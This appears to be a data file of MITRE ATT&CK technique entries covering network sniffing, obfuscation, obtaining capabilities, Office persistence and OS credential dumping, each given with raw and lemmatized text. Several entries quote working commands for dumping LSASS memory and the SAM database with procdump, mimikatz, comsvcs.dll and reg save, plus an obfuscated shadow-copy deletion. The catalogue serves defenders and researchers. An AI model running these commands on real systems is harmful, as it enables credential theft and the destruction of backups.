T1040,Network Sniffing,"Adversaries may sniff network traffic to capture information about an environment, including authentication material passed over the network. Network sniffing refers to using the network interface on a system to monitor or capture information sent over a wired or wireless connection. An adversary may place a network interface into promiscuous mode to passively access data in transit over the network, or use span ports to capture a larger amount of data.Data captured via this technique may include user credentials, especially those sent over an insecure, unencrypted protocol. Techniques for name service resolution poisoning, such as LLMNR/NBT-NS Poisoning and SMB Relay, can also be used to capture credentials to websites, proxies, and internal systems by redirecting traffic to an adversary.Network sniffing may also reveal configuration details, such as running services, version numbers, and other network characteristics (e.g. IP addresses, hostnames, VLAN IDs) necessary for subsequent Lateral Movement and/or Defense Evasion activities.In cloud-based environments, adversaries may still be able to use traffic mirroring services to sniff network traffic from virtual machines. For example, AWS Traffic Mirroring, GCP Packet Mirroring, and Azure vTap allow users to define specified instances to collect traffic from and specified targets to send collected traffic to.On network devices, adversaries may perform network captures using Network Device CLI commands such as monitor capture.",adversary sniff network traffic capture information environment include authentication material pass network network sniffing refer network interface system monitor capture information send wired wireless connection adversary place network interface promiscuous mode passively access datum transit network use span port capture large datum datum capture technique include user credential especially send insecure unencrypted protocol technique service resolution poisoning llmnr nbt ns poisoning smb relay capture credential website proxy internal system redirect traffic adversary network sniffing reveal configuration detail run service version number network characteristic ip address hostname vlan id necessary subsequent lateral movement defense evasion activity cloud base environment adversary able use traffic mirroring service sniff network traffic virtual machine example aws traffic mirroring gcp packet mirroring azure vtap allow user define specify instance collect traffic specified target send collect traffic network device adversary perform network capture network device cli command monitor capture
T1095,Non-Application Layer Protocol,"Adversaries may use an OSI non-application layer protocol for communication between host and C2 server or among infected hosts within a network. The list of possible protocols is extensive. Specific examples include use of network layer protocols, such as the Internet Control Message Protocol (ICMP), transport layer protocols, such as the User Datagram Protocol (UDP), session layer protocols, such as Socket Secure (SOCKS), as well as redirected/tunneled protocols, such as Serial over LAN (SOL).ICMP communication between hosts is one example. However, it is not as commonly monitored as other Internet Protocols such as TCP or UDP and may be used by adversaries to hide communications.",adversary use osi non application layer protocol communication host server infected host network list possible protocol extensive specific example include use network layer protocol internet control message protocol icmp transport layer protocol user datagram protocol udp session layer protocol socket secure socks redirect tunnel protocol serial lan communication host example commonly monitor internet protocol tcp udp adversary hide communication
T1571,Non-Standard Port,"Adversaries may communicate using a protocol and port pairing that are typically not associated. For example, HTTPS over port 8088 as opposed to the traditional port 443. Adversaries may make changes to the standard port used by a protocol to bypass filtering or muddle analysis/parsing of network data.Adversaries may also make changes to victim systems to abuse non-standard ports. For example, Registry keys and other configuration settings can be used to modify protocol and port pairings.",adversary communicate protocol port pairing typically associate example https port oppose traditional port adversary change standard port protocol bypass filtering muddle analysis parsing network datum adversary change victim system abuse non standard port example registry key configuration setting modify protocol port pairing
T1027,Obfuscated Files or Information,"Adversaries may attempt to make an executable or file difficult to discover or analyze by encrypting, encoding, or otherwise obfuscating its contents on the system or in transit. This is common behavior that can be used across different platforms and the network to evade defenses. Payloads may be compressed, archived, or encrypted in order to avoid detection. These payloads may be used during Initial Access or later to mitigate detection. Sometimes a user's action may be required to open and Deobfuscate/Decode Files or Information for User Execution. The user may also be required to input a password to open a password protected compressed/encrypted file that was provided by the adversary. Adversaries may also use compressed or archived scripts, such as JavaScript. Portions of files can also be encoded to hide the plain-text strings that would otherwise help defenders with discovery. Adversaries may also abuse Command Obfuscation to obscure commands executed from payloads or directly via Command and Scripting Interpreter. Environment variables, aliases, characters, and other platform/language specific semantics can be used to evade signature based detections and application control mechanisms.",adversary attempt executable file difficult discover analyze encrypt encode obfuscate content system transit common behavior different platform network evade defense payload compress archive encrypt order avoid detection payload initial access later mitigate detection user action require open deobfuscate decode file information user execution user require input password open password protect compress encrypt file provide adversary adversary use compressed archived script javascript portion file encode hide plain text string help defender discovery adversary abuse command obfuscation obscure command execute payload directly command scripting interpreter environment variable alias character platform language specific semantic evade signature base detection application control mechanism
T1027.001,Obfuscated Files or Information: Binary Padding,"Adversaries may use binary padding to add junk data and change the on-disk representation of malware. This can be done without affecting the functionality or behavior of a binary, but can increase the size of the binary beyond what some security tools are capable of handling due to file size limitations. Binary padding effectively changes the checksum of the file and can also be used to avoid hash-based blocklists and static anti-virus signatures.",adversary use binary padding add junk datum change disk representation malware affect functionality behavior binary increase size binary security tool capable handle file size limitation binary padding effectively change checksum file avoid hash base blocklist static anti virus signature
T1027.002,Obfuscated Files or Information: Software Packing,"Adversaries may perform software packing or virtual machine software protection to conceal their code. Software packing is a method of compressing or encrypting an executable. Packing an executable changes the file signature in an attempt to avoid signature-based detection. Most decompression techniques decompress the executable code in memory. Virtual machine software protection translates an executable's original code into a special format that only a special virtual machine can run. A virtual machine is then called to run this code. Utilities used to perform software packing are called packers. Example packers are MPRESS and UPX. A more comprehensive list of known packers is available, but adversaries may create their own packing techniques that do not leave the same artifacts as well-known packers to evade defenses.",adversary perform software packing virtual machine software protection conceal code software packing method compress encrypt executable pack executable change file signature attempt avoid signature base detection decompression technique decompress executable code memory virtual machine software protection translate executable original code special format special virtual machine run virtual machine call run code utility perform software packing call packer example packer mpress upx comprehensive list know packer available adversary create packing technique leave artifact know packer evade defense
T1027.003,Obfuscated Files or Information: Steganography,"Adversaries may use steganography techniques in order to prevent the detection of hidden information. Steganographic techniques can be used to hide data in digital media such as images, audio tracks, video clips, or text files.Duqu was an early example of malware that used steganography. It encrypted the gathered information from a victim's system and hid it within an image before exfiltrating the image to a C2 server. By the end of 2017, a threat group used Invoke-PSImage to hide PowerShell commands in an image file (.png) and execute the code on a victim's system. In this particular case the PowerShell code downloaded another obfuscated script to gather intelligence from the victim's machine and communicate it back to the adversary.",adversary use steganography technique order prevent detection hidden information steganographic technique hide datum digital medium image audio track video clip text file duqu early example malware steganography encrypt gather information victim system hide image exfiltrate image server end threat group invoke psimage hide powershell command image file execute code victim system particular case powershell code download obfuscate script gather intelligence victim machine communicate adversary
T1027.004,Obfuscated Files or Information: Compile After Delivery,"Adversaries may attempt to make payloads difficult to discover and analyze by delivering files to victims as uncompiled code. Text-based source code files may subvert analysis and scrutiny from protections targeting executables/binaries. These payloads will need to be compiled before execution; typically via native utilities such as csc.exe or GCC/MinGW.Source code payloads may also be encrypted, encoded, and/or embedded within other files, such as those delivered as a Phishing. Payloads may also be delivered in formats unrecognizable and inherently benign to the native OS (ex: EXEs on macOS/Linux) before later being (re)compiled into a proper executable binary with a bundled compiler and execution framework.",adversary attempt payload difficult discover analyze deliver file victim uncompiled code text base source code file subvert analysis scrutiny protection target executable binary payload need compile execution typically native utility gcc code payload encrypt encode embed file deliver phishing payload deliver format unrecognizable inherently benign native os ex exes macos linux later proper executable binary bundle compiler execution framework
T1027.005,Obfuscated Files or Information: Indicator Removal from Tools,"Adversaries may remove indicators from tools if they believe their malicious tool was detected, quarantined, or otherwise curtailed. They can modify the tool by removing the indicator and using the updated version that is no longer detected by the target's defensive systems or subsequent targets that may use similar systems.A good example of this is when malware is detected with a file signature and quarantined by anti-virus software. An adversary who can determine that the malware was quarantined because of its file signature may modify the file to explicitly avoid that signature, and then re-use the malware.",adversary remove indicator tool believe malicious tool detect quarantine curtail modify tool remove indicator update version long detect target defensive system subsequent target use similar system good example malware detect file signature quarantine anti virus software adversary determine malware quarantine file signature modify file explicitly avoid signature use malware
T1027.006,Obfuscated Files or Information: HTML Smuggling,"Adversaries may smuggle data and files past content filters by hiding malicious payloads inside of seemingly benign HTML files. HTML documents can store large binary objects known as JavaScript Blobs (immutable data that represents raw bytes) that can later be constructed into file-like objects. Data may also be stored in Data URLs, which enable embedding media type or MIME files inline of HTML documents. HTML5 also introduced a download attribute that may be used to initiate file downloads.Adversaries may deliver payloads to victims that bypass security controls through HTML Smuggling by abusing JavaScript Blobs and/or HTML5 download attributes. Security controls such as web content filters may not identify smuggled malicious files inside of HTML/JS files, as the content may be based on typically benign MIME types such as text/plain and/or text/html. Malicious files or data can be obfuscated and hidden inside of HTML files through Data URLs and/or JavaScript Blobs and can be deobfuscated when they reach the victim (i.e. Deobfuscate/Decode Files or Information), potentially bypassing content filters.For example, JavaScript Blobs can be abused to dynamically generate malicious files in the victim machine and may be dropped to disk by abusing JavaScript functions such as msSaveBlob.",adversary smuggle datum file past content filter hide malicious payload inside seemingly benign html file html document store large binary object know javascript blobs immutable data represent raw byte later construct file like object datum store data url enable embed medium type mime file inline html document introduce download attribute initiate file download adversary deliver payload victim bypass security control html smuggling abuse javascript blobs download attribute security control web content filter identify smuggle malicious file inside html js file content base typically benign mime type text plain text html malicious file datum obfuscate hide inside html file datum url javascript blob deobfuscate reach victim deobfuscate decode file information potentially bypass content filter example javascript blob abuse dynamically generate malicious file victim machine drop disk abuse javascript function mssaveblob
T1027.007,Obfuscated Files or Information: Dynamic API Resolution,"Adversaries may obfuscate then dynamically resolve API functions called by their malware in order to conceal malicious functionalities and impair defensive analysis. Malware commonly uses various Native API functions provided by the OS to perform various tasks such as those involving processes, files, and other system artifacts.API functions called by malware may leave static artifacts such as strings in payload files. Defensive analysts may also uncover which functions a binary file may execute via an import address table (IAT) or other structures that help dynamically link calling code to the shared modules that provide functions.To avoid static or other defensive analysis, adversaries may use dynamic API resolution to conceal malware characteristics and functionalities. Similar to Software Packing, dynamic API resolution may change file signatures and obfuscate malicious API function calls until they are resolved and invoked during runtime.Various methods may be used to obfuscate malware calls to API functions. For example, hashes of function names are commonly stored in malware in lieu of literal strings. Malware can use these hashes (or other identifiers) to manually reproduce the linking and loading process using functions such as GetProcAddress() and LoadLibrary(). These hashes/identifiers can also be further obfuscated using encryption or other string manipulation tricks (requiring various forms of Deobfuscate/Decode Files or Information during execution).",adversary obfuscate dynamically resolve api function call malware order conceal malicious functionality impair defensive analysis malware commonly use native api function provide os perform task involve process file system artifact api function call malware leave static artifact string payload file defensive analyst uncover function binary file execute import address table iat structure help dynamically link call code share module provide function avoid static defensive analysis adversary use dynamic api resolution conceal malware characteristic functionality similar software packing dynamic api resolution change file signature obfuscate malicious api function call resolve invoke runtime method obfuscate malware call api function example hash function name commonly store malware lieu literal string malware use hash identifier manually reproduce link loading process function getprocaddress loadlibrary hash identifier obfuscate encryption string manipulation trick require form deobfuscate decode files information execution
T1027.008,Obfuscated Files or Information: Stripped Payloads,"Adversaries may attempt to make a payload difficult to analyze by removing symbols, strings, and other human readable information. Scripts and executables may contain variables names and other strings that help developers document code functionality. Symbols are often created by an operating system’s linker when executable payloads are compiled. Reverse engineers use these symbols and strings to analyze code and to identify functionality in payloads.Adversaries may use stripped payloads in order to make malware analysis more difficult. For example, compilers and other tools may provide features to remove or obfuscate strings and symbols. Adversaries have also used stripped payload formats, such as run-only AppleScripts, a compiled and stripped version of AppleScript, to evade detection and analysis. The lack of human-readable information may directly hinder detection and analysis of payloads.",adversary attempt payload difficult analyze remove symbol string human readable information script executable contain variable name string help developer document code functionality symbol create operate system linker executable payload compile reverse engineer use symbol string analyze code identify functionality payload adversary use strip payload order malware analysis difficult example compiler tool provide feature remove obfuscate string symbol adversary strip payload format run applescripts compile strip version applescript evade detection analysis lack human readable information directly hinder detection analysis payload
T1027.009,Obfuscated Files or Information: Embedded Payloads,"Adversaries may embed payloads within other files to conceal malicious content from defenses. Otherwise seemingly benign files (such as scripts and executables) may be abused to carry and obfuscate malicious payloads and content. In some cases, embedded payloads may also enable adversaries to Subvert Trust Controls by not impacting execution controls such as digital signatures and notarization tickets. Adversaries may embed payloads in various file formats to hide payloads. For example, adversaries have been observed embedding payloads within or as an overlay of an otherwise benign binary. Embedded content may also be used as Process Injection payloads used to infect benign system processes.",adversary embed payload file conceal malicious content defense seemingly benign file script executable abuse carry obfuscate malicious payload content case embed payload enable adversary subvert trust controls impact execution control digital signature notarization ticket adversary embed payload file format hide payload example adversary observe embed payload overlay benign binary embedded content process injection payload infect benign system process
T1027.010,Obfuscated Files or Information: Command Obfuscation,"Adversaries may obfuscate content during command execution to impede detection. Command-line obfuscation is a method of making strings and patterns within commands and scripts more difficult to signature and analyze. This type of obfuscation can be included within commands executed by delivered payloads (e.g., Phishing and Drive-by Compromise) or interactively via Command and Scripting Interpreter.For example, adversaries may abuse syntax that utilizes various symbols and escape characters (such as spacing, ^, +. $, and %) to make commands difficult to analyze while maintaining the same intended functionality.Adversaries may also use tricks such as directory traversals to obfuscate references to the binary being invoked by a command (C:\voi\pcw\..\..\Windows\tei\qs\k\..\..\..\system32\erool\..\wbem\wg\je\..\..\wmic.exe shadowcopy delete).Tools such as Invoke-Obfuscation and Invoke-DOSfucation have also been used to obfuscate commands.",adversary obfuscate content command execution impede detection command line obfuscation method make string pattern command script difficult signature analyze type obfuscation include command execute deliver payload phishing drive compromise interactively command scripting interpreter example adversary abuse syntax utilize symbol escape character spacing command difficult analyze maintain intend functionality adversary use trick directory traversal obfuscate reference binary invoke command shadowcopy invoke obfuscation invoke dosfucation obfuscate command
T1027.011,Obfuscated Files or Information: Fileless Storage,"Adversaries may store data in ""fileless"" formats to conceal malicious activity from defenses. Fileless storage can be broadly defined as any format other than a file. Common examples of non-volatile fileless storage include the Windows Registry, event logs, or WMI repository.Similar to fileless in-memory behaviors such as Reflective Code Loading and Process Injection, fileless data storage may remain undetected by anti-virus and other endpoint security tools that can only access specific file formats from disk storage.Adversaries may use fileless storage to conceal various types of stored data, including payloads/shellcode (potentially being used as part of Persistence) and collected data not yet exfiltrated from the victim (e.g., Local Data Staging). Adversaries also often encrypt, encode, splice, or otherwise obfuscate this fileless data when stored.Some forms of fileless storage activity may indirectly create artifacts in the file system, but in central and otherwise difficult to inspect formats such as the WMI (e.g., %SystemRoot%\System32\Wbem\Repository) or Registry (e.g., %SystemRoot%\System32\Config) physical files.",adversary store datum fileless format conceal malicious activity defense fileless storage broadly define format file common example non volatile fileless storage include windows registry event log wmi repository similar fileless memory behavior reflective code loading process injection fileless datum storage remain undetected anti virus endpoint security tool access specific file format disk storage adversary use fileless storage conceal type store datum include payload shellcode potentially persistence collect datum exfiltrate victim local data staging adversary encrypt encode splice obfuscate fileless datum store form fileless storage activity indirectly create artifact file system central difficult inspect format wmi registry physical file
T1588,Obtain Capabilities,"Adversaries may buy and/or steal capabilities that can be used during targeting. Rather than developing their own capabilities in-house, adversaries may purchase, freely download, or steal them. Activities may include the acquisition of malware, software (including licenses), exploits, certificates, and information relating to vulnerabilities. Adversaries may obtain capabilities to support their operations throughout numerous phases of the adversary lifecycle.In addition to downloading free malware, software, and exploits from the internet, adversaries may purchase these capabilities from third-party entities. Third-party entities can include technology companies that specialize in malware and exploits, criminal marketplaces, or from individuals.In addition to purchasing capabilities, adversaries may steal capabilities from third-party entities (including other adversaries). This can include stealing software licenses, malware, SSL/TLS and code-signing certificates, or raiding closed databases of vulnerabilities or exploits.",adversary buy steal capability targeting develop capability house adversary purchase freely download steal activity include acquisition malware software include license exploit certificate information relate vulnerability adversary obtain capability support operation numerous phase adversary lifecycle addition download free malware software exploit internet adversary purchase capability party entity party entity include technology company specialize malware exploit criminal marketplace individual addition purchase capability adversary steal capability party entity include adversary include steal software license malware ssl tls code signing certificate raid closed database vulnerability exploit
T1588.001,Obtain Capabilities: Malware,"Adversaries may buy, steal, or download malware that can be used during targeting. Malicious software can include payloads, droppers, post-compromise tools, backdoors, packers, and C2 protocols. Adversaries may acquire malware to support their operations, obtaining a means for maintaining control of remote machines, evading defenses, and executing post-compromise behaviors.In addition to downloading free malware from the internet, adversaries may purchase these capabilities from third-party entities. Third-party entities can include technology companies that specialize in malware development, criminal marketplaces (including Malware-as-a-Service, or MaaS), or from individuals. In addition to purchasing malware, adversaries may steal and repurpose malware from third-party entities (including other adversaries).",adversary buy steal download malware targeting malicious software include payload dropper post compromise tool backdoor packer protocol adversary acquire malware support operation obtain means maintain control remote machine evade defense execute post compromise behavior addition download free malware internet adversary purchase capability party entity party entity include technology company specialize malware development criminal marketplace include malware service maas individual addition purchase malware adversary steal repurpose malware party entity include adversary
T1588.002,Obtain Capabilities: Tool,"Adversaries may buy, steal, or download software tools that can be used during targeting. Tools can be open or closed source, free or commercial. A tool can be used for malicious purposes by an adversary, but (unlike malware) were not intended to be used for those purposes (ex: PsExec). Tool acquisition can involve the procurement of commercial software licenses, including for red teaming tools such as Cobalt Strike. Commercial software may be obtained through purchase, stealing licenses (or licensed copies of the software), or cracking trial versions.Adversaries may obtain tools to support their operations, including to support execution of post-compromise behaviors. In addition to freely downloading or purchasing software, adversaries may steal software and/or software licenses from third-party entities (including other adversaries).",adversary buy steal download software tool targeting tool open closed source free commercial tool malicious purpose adversary unlike malware intend purpose ex psexec tool acquisition involve procurement commercial software license include red teaming tool cobalt strike commercial software obtain purchase steal license license copy software crack trial version adversary obtain tool support operation include support execution post compromise behavior addition freely download purchase software adversary steal software software license party entity include adversary
T1588.003,Obtain Capabilities: Code Signing Certificates,"Adversaries may buy and/or steal code signing certificates that can be used during targeting. Code signing is the process of digitally signing executables and scripts to confirm the software author and guarantee that the code has not been altered or corrupted. Code signing provides a level of authenticity for a program from the developer and a guarantee that the program has not been tampered with. Users and/or security tools may trust a signed piece of code more than an unsigned piece of code even if they don't know who issued the certificate or who the author is.Prior to Code Signing, adversaries may purchase or steal code signing certificates for use in operations. The purchase of code signing certificates may be done using a front organization or using information stolen from a previously compromised entity that allows the adversary to validate to a certificate provider as that entity. Adversaries may also steal code signing materials directly from a compromised third-party.",adversary buy steal code signing certificate targeting code signing process digitally sign executable script confirm software author guarantee code alter corrupt code signing provide level authenticity program developer guarantee program tamper user security tool trust sign piece code unsigned piece code know issue certificate author prior code signing adversary purchase steal code signing certificate use operation purchase code signing certificate organization information steal previously compromise entity allow adversary validate certificate provider entity adversary steal code signing material directly compromise party
T1588.004,Obtain Capabilities: Digital Certificates,"Adversaries may buy and/or steal SSL/TLS certificates that can be used during targeting. SSL/TLS certificates are designed to instill trust. They include information about the key, information about its owner's identity, and the digital signature of an entity that has verified the certificate's contents are correct. If the signature is valid, and the person examining the certificate trusts the signer, then they know they can use that key to communicate with its owner.Adversaries may purchase or steal SSL/TLS certificates to further their operations, such as encrypting C2 traffic (ex: Asymmetric Cryptography with Web Protocols) or even enabling Adversary-in-the-Middle if the certificate is trusted or otherwise added to the root of trust (i.e. Install Root Certificate). The purchase of digital certificates may be done using a front organization or using information stolen from a previously compromised entity that allows the adversary to validate to a certificate provider as that entity. Adversaries may also steal certificate materials directly from a compromised third-party, including from certificate authorities. Adversaries may register or hijack domains that they will later purchase an SSL/TLS certificate for.Certificate authorities exist that allow adversaries to acquire SSL/TLS certificates, such as domain validation certificates, for free.After obtaining a digital certificate, an adversary may then install that certificate (see Install Digital Certificate) on infrastructure under their control.",adversary buy steal ssl tls certificate targeting ssl tls certificate design instill trust include information key information owner identity digital signature entity verify certificate content correct signature valid person examine certificate trust signer know use key communicate owner adversary purchase steal ssl tls certificate operation encrypt traffic ex asymmetric cryptography web protocols enable adversary middle certificate trust add root trust install root certificate purchase digital certificate organization information steal previously compromised entity allow adversary validate certificate provider entity adversary steal certificate material directly compromise party include certificate authority adversary register hijack domain later purchase ssl tls certificate certificate authority exist allow adversary acquire ssl tls certificate domain validation certificate free obtain digital certificate adversary install certificate install digital certificate infrastructure control
T1588.005,Obtain Capabilities: Exploits,"Adversaries may buy, steal, or download exploits that can be used during targeting. An exploit takes advantage of a bug or vulnerability in order to cause unintended or unanticipated behavior to occur on computer hardware or software. Rather than developing their own exploits, an adversary may find/modify exploits from online or purchase them from exploit vendors.In addition to downloading free exploits from the internet, adversaries may purchase exploits from third-party entities. Third-party entities can include technology companies that specialize in exploit development, criminal marketplaces (including exploit kits), or from individuals.An adversary may monitor exploit provider forums to understand the state of existing, as well as newly discovered, exploits. There is usually a delay between when an exploit is discovered and when it is made public. An adversary may target the systems of those known to conduct exploit research and development in order to gain that knowledge for use during a subsequent operation.Adversaries may use exploits during various phases of the adversary lifecycle (i.e. Exploit Public-Facing Application, Exploitation for Client Execution, Exploitation for Privilege Escalation, Exploitation for Defense Evasion, Exploitation for Credential Access, Exploitation of Remote Services, and Application or System Exploitation).",adversary buy steal download exploit targeting exploit take advantage bug vulnerability order cause unintended unanticipated behavior occur computer hardware software develop exploit adversary find modify exploit online purchase exploit vendor addition download free exploit internet adversary purchase exploit party entity party entity include technology company specialize exploit development criminal marketplace include exploit kit individual adversary monitor exploit provider forum understand state exist newly discover exploit usually delay exploit discover public adversary target system know conduct exploit research development order gain knowledge use subsequent operation adversary use exploit phase adversary lifecycle exploit public facing application exploitation client execution exploitation privilege escalation exploitation defense evasion exploitation credential access exploitation remote service application system exploitation
T1588.006,Obtain Capabilities: Vulnerabilities,"Adversaries may acquire information about vulnerabilities that can be used during targeting. A vulnerability is a weakness in computer hardware or software that can, potentially, be exploited by an adversary to cause unintended or unanticipated behavior to occur. Adversaries may find vulnerability information by searching open databases or gaining access to closed vulnerability databases.An adversary may monitor vulnerability disclosures/databases to understand the state of existing, as well as newly discovered, vulnerabilities. There is usually a delay between when a vulnerability is discovered and when it is made public. An adversary may target the systems of those known to conduct vulnerability research (including commercial vendors). Knowledge of a vulnerability may cause an adversary to search for an existing exploit (i.e. Exploits) or to attempt to develop one themselves (i.e. Exploits).",adversary acquire information vulnerability targeting vulnerability weakness computer hardware software potentially exploit adversary cause unintended unanticipated behavior occur adversary find vulnerability information search open database gain access closed vulnerability database adversary monitor vulnerability disclosure database understand state exist newly discover vulnerability usually delay vulnerability discover public adversary target system know conduct vulnerability research include commercial vendor knowledge vulnerability cause adversary search exist exploit exploits attempt develop exploits
T1137,Office Application Startup,"Adversaries may leverage Microsoft Office-based applications for persistence between startups. Microsoft Office is a fairly common application suite on Windows-based operating systems within an enterprise network. There are multiple mechanisms that can be used with Office for persistence when an Office-based application is started; this can include the use of Office Template Macros and add-ins.A variety of features have been discovered in Outlook that can be abused to obtain persistence, such as Outlook rules, forms, and Home Page.",adversary leverage microsoft office base application persistence startup microsoft office fairly common application suite windows base operate system enterprise network multiple mechanism office persistence office base application start include use office template macros add in variety feature discover outlook abuse obtain persistence outlook rule form home page
T1137.001,Office Application Startup: Office Template Macros,"Adversaries may abuse Microsoft Office templates to obtain persistence on a compromised system. Microsoft Office contains templates that are part of common Office applications and are used to customize styles. The base templates within the application are used each time an application starts. Office Visual Basic for Applications (VBA) macros Word Normal.dotm location:C:\Users\<username>\AppData\Roaming\Microsoft\Templates\Normal.dotmExcel Personal.xlsb location:C:\Users\<username>\AppData\Roaming\Microsoft\Excel\XLSTART\PERSONAL.XLSBAdversaries may also change the location of the base template to point to their own by hijacking the application's search order, e.g. Word 2016 will first look for Normal.dotm under C:\Program Files (x86)\Microsoft Office\root\Office16\, or by modifying the GlobalDotName registry key. By modifying the GlobalDotName registry key an adversary can specify an arbitrary location, file name, and file extension to use for the template that will be loaded on application startup. To abuse GlobalDotName, adversaries may first need to register the template as a trusted document or place it in a trusted location. An adversary may need to enable macros to execute unrestricted depending on the system or enterprise security policy on use of macros.",adversary abuse microsoft office template obtain persistence compromised system microsoft office contain template common office application customize style base template application time application start office visual basic applications vba macro word location location change location base template point hijack application search order word look files modify globaldotname registry key modify globaldotname registry key adversary specify arbitrary location file file extension use template load application startup abuse globaldotname adversary need register template trusted document place trusted location adversary need enable macro execute unrestricted depend system enterprise security policy use macro
T1137.002,Office Application Startup: Office Test,"Adversaries may abuse the Microsoft Office ""Office Test"" Registry key to obtain persistence on a compromised system. An Office Test Registry location exists that allows a user to specify an arbitrary DLL that will be executed every time an Office application is started. This Registry key is thought to be used by Microsoft to load DLLs for testing and debugging purposes while developing Office applications. This Registry key is not created by default during an Office installation.There exist user and global Registry keys for the Office Test feature:HKEY_CURRENT_USER\Software\Microsoft\Office test\Special\Perf HKEY_LOCAL_MACHINE\Software\Microsoft\Office test\Special\PerfAdversaries may add this Registry key and specify a malicious DLL that will be executed whenever an Office application, such as Word or Excel, is started.",adversary abuse microsoft office office test registry key obtain persistence compromised system office test registry location exist allow user specify arbitrary dll execute time office application start registry key think microsoft load dll testing debugging purpose develop office application registry key create default office installation exist user global registry key office test feature add registry key specify malicious dll execute office application word excel start
T1137.003,Office Application Startup: Outlook Forms,"Adversaries may abuse Microsoft Outlook forms to obtain persistence on a compromised system. Outlook forms are used as templates for presentation and functionality in Outlook messages. Custom Outlook forms can be created that will execute code when a specifically crafted email is sent by an adversary utilizing the same custom Outlook form.Once malicious forms have been added to the user’s mailbox, they will be loaded when Outlook is started. Malicious forms will execute when an adversary sends a specifically crafted email to the user.",adversary abuse microsoft outlook form obtain persistence compromised system outlook form template presentation functionality outlook message custom outlook form create execute code specifically craft email send adversary utilize custom outlook form malicious form add user mailbox load outlook start malicious form execute adversary send specifically craft email user
T1137.004,Office Application Startup: Outlook Home Page,"Adversaries may abuse Microsoft Outlook's Home Page feature to obtain persistence on a compromised system. Outlook Home Page is a legacy feature used to customize the presentation of Outlook folders. This feature allows for an internal or external URL to be loaded and presented whenever a folder is opened. A malicious HTML page can be crafted that will execute code when loaded by Outlook Home Page.Once malicious home pages have been added to the user’s mailbox, they will be loaded when Outlook is started. Malicious Home Pages will execute when the right Outlook folder is loaded/reloaded.",adversary abuse microsoft outlook home page feature obtain persistence compromised system outlook home page legacy feature customize presentation outlook folder feature allow internal external url load present folder open malicious html page craft execute code load outlook home page malicious home page add user mailbox load outlook start malicious home pages execute right outlook folder load reload
T1137.005,Office Application Startup: Outlook Rules,"Adversaries may abuse Microsoft Outlook rules to obtain persistence on a compromised system. Outlook rules allow a user to define automated behavior to manage email messages. A benign rule might, for example, automatically move an email to a particular folder in Outlook if it contains specific words from a specific sender. Malicious Outlook rules can be created that can trigger code execution when an adversary sends a specifically crafted email to that user.Once malicious rules have been added to the user’s mailbox, they will be loaded when Outlook is started. Malicious rules will execute when an adversary sends a specifically crafted email to the user.",adversary abuse microsoft outlook rule obtain persistence compromised system outlook rule allow user define automate behavior manage email message benign rule example automatically email particular folder outlook contain specific word specific sender malicious outlook rule create trigger code execution adversary send specifically craft email user malicious rule add user mailbox load outlook start malicious rule execute adversary send specifically craft email user
T1137.006,Office Application Startup: Add-ins,Adversaries may abuse Microsoft Office add-ins to obtain persistence on a compromised system. Office add-ins can be used to add functionality to Office programs. Add-ins can be used to obtain persistence because they can be set to execute code when an Office application starts.,adversary abuse microsoft office add in obtain persistence compromised system office add in add functionality office program add in obtain persistence set execute code office application start
T1003,OS Credential Dumping,"Adversaries may attempt to dump credentials to obtain account login and credential material, normally in the form of a hash or a clear text password, from the operating system and software. Credentials can then be used to perform Lateral Movement and access restricted information.Several of the tools mentioned in associated sub-techniques may be used by both adversaries and professional security testers. Additional custom tools likely exist as well.",adversary attempt dump credential obtain account login credential material normally form hash clear text password operate system software credential perform lateral movement access restricted information tool mention associate sub technique adversary professional security tester additional custom tool likely exist
T1003.001,OS Credential Dumping: LSASS Memory,"Adversaries may attempt to access credential material stored in the process memory of the Local Security Authority Subsystem Service (LSASS). After a user logs on, the system generates and stores a variety of credential materials in LSASS process memory. These credential materials can be harvested by an administrative user or SYSTEM and used to conduct Lateral Movement using Use Alternate Authentication Material.As well as in-memory techniques, the LSASS process memory can be dumped from the target host and analyzed on a local system.For example, on the target host use procdump:procdump -ma lsass.exe lsass_dumpLocally, mimikatz can be run using:sekurlsa::Minidump lsassdump.dmp sekurlsa::logonPasswordsBuilt-in Windows tools such as comsvcs.dll can also be used:rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump PID lsass.dmp fullWindows Security Support Provider (SSP) DLLs are loaded into LSASS process at system start. Once loaded into the LSA, SSP DLLs have access to encrypted and plaintext passwords that are stored in Windows, such as any logged-on user's Domain password or smart card PINs. The SSP configuration is stored in two Registry keys: HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages and HKLM\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\Security Packages. An adversary may modify these Registry keys to add new SSPs, which will be loaded the next time the system boots, or when the AddSecurityPackage Windows API function is called.The following SSPs can be used to access credentials:Msv: Interactive logons, batch logons, and service logons are done through the MSV authentication package. Wdigest: The Digest Authentication protocol is designed for use with Hypertext Transfer Protocol (HTTP) and Simple Authentication Security Layer (SASL) exchanges. Kerberos: Preferred for mutual client-server domain authentication in Windows 2000 and later. CredSSP: Provides SSO and Network Level Authentication for Remote Desktop Services.",adversary attempt access credential material store process memory local security authority subsystem service lsass user log system generate store variety credential material lsass process memory credential material harvest administrative user system conduct lateral movement use alternate authentication material memory technique lsass process memory dump target host analyze local system example target host use procdump procdump mimikatz run windows tool minidump pid fullwindows security support provider ssp dll load lsass process system start load lsa ssp dll access encrypted plaintext password store windows log user domain password smart card pin ssp configuration store registry key packages packages adversary modify registry key add new ssp load time system boot addsecuritypackage windows api function call following ssp access credential msv interactive logon batch logon service logon msv authentication package wdigest digest authentication protocol design use hypertext transfer protocol http simple authentication security layer sasl exchange kerberos prefer mutual client server domain authentication windows later credssp provide sso network level authentication remote desktop service
T1003.002,OS Credential Dumping: Security Account Manager,"Adversaries may attempt to extract credential material from the Security Account Manager (SAM) database either through in-memory techniques or through the Windows Registry where the SAM database is stored. The SAM is a database file that contains local accounts for the host, typically those found with the net user command. Enumerating the SAM database requires SYSTEM level access.A number of tools can be used to retrieve the SAM file through in-memory techniques:pwdumpx.exe gsecdump Mimikatz secretsdump.pyAlternatively, the SAM can be extracted from the Registry with Reg:reg save HKLM\sam sam reg save HKLM\system systemCreddump7 can then be used to process the SAM database locally to retrieve hashes.Notes: RID 500 account is the local, built-in administrator. RID 501 is the guest account. User accounts start with a RID of 1,000+.",adversary attempt extract credential material security account manager sam database memory technique windows registry sam database store sam database file contain local account host typically find net user command enumerate sam database require system level access number tool retrieve sam file memory technique gsecdump mimikatz sam extract registry reg reg save sam reg save process sam database locally retrieve hash note rid account local build administrator rid guest account user account start rid
